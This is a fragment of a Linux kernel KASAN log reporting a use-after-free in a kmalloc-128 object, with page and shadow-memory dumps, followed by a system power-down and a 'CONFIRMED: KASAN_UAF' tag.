[    2.036981] 
[    2.037065] The buggy address belongs to the object at ffff888009d8ee00
[    2.037065]  which belongs to the cache kmalloc-128 of size 128
[    2.037672] The buggy address is located 24 bytes inside of
[    2.037672]  freed 128-byte region [ffff888009d8ee00, ffff888009d8ee80)
[    2.038258] 
[    2.038341] The buggy address belongs to the physical page:
[    2.038617] page:0000000042f5fb75 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x9d8e
[    2.039066] flags: 0x100000000000200(slab|node=0|zone=1)
[    2.039328] page_type: 0xffffffff()
[    2.039509] raw: 0100000000000200 ffff8880064418c0 dead000000000122 0000000000000000
[    2.039886] raw: 0000000000000000 0000000000100010 00000001ffffffff 0000000000000000
[    2.040264] page dumped because: kasan: bad access detected
[    2.040539] 
[    2.040622] Memory state around the buggy address:
[    2.040860]  ffff888009d8ed00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[    2.041142]  ffff888009d8ed80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    2.041421] >ffff888009d8ee00: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    2.041702]                             ^
[    2.041860]  ffff888009d8ee80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    2.042138]  ffff888009d8ef00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fc fc
[    2.042416] ==================================================================
[    2.042711] Disabling lock debugging due to kernel taint
[    3.236325] ACPI: PM: Preparing to enter system sleep state S5
[    3.236641] reboot: Power down
CONFIRMED: KASAN_UAF
